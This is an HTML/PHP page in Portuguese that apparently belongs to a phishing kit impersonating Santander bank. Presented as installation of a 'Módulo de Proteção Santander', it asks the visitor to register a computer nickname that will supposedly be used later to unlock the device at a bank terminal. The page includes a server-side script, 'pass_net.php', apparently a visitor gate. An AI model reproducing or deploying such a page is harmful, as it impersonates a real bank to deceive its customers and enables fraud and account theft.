<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle" style="margin-bottom: 20px!important;">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased" style="line-height: 1.3em;">
					Para iniciarmos a <strong style="font-weight:700;color:#ff0000;">instalação do Módulo de Proteção Santander</strong>, precisaremos realizar o cadastro deste computador.<br><br>
					Por favor, informe o nome de identificação deste computador. <br>
					Este apelido será usado para identificar este dispostivo, e posteriormente realizar o desbloqueio do mesmo em um terminal de auto atendimento.<br><br>
					O apelido deve ser um nome para reconhecer este computador. Por ex.: <strong style="font-weight:600;color:#ff0000;">PC sala, PC quarto, Notebook</strong>.<br><br>
					Agora, você deve informar o apelido deste dispostivo para continuarmos com a instalação do Módulo de Segurança Santander.
				</p>
			</div>

			<div class="md_boxTables">
				
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkApelido();">
					<span>Apelido do computador:</span>
					<input type="text" name="is_apelido" id="is_apelido" class="input_ass" maxlength="8" autocomplete="off">
					
					<input type="hidden" name="sender" id="sender" value="apelido">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="continuar">
				</form>
			
				<span class="note_atr">
					<b class="red_txt">ATENÇÃO:</b><br>
					Você pode utilizar letras e números, respeitando o limite de até 8 caracteres!
					<br>Não utilizar caracteres especiais!
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>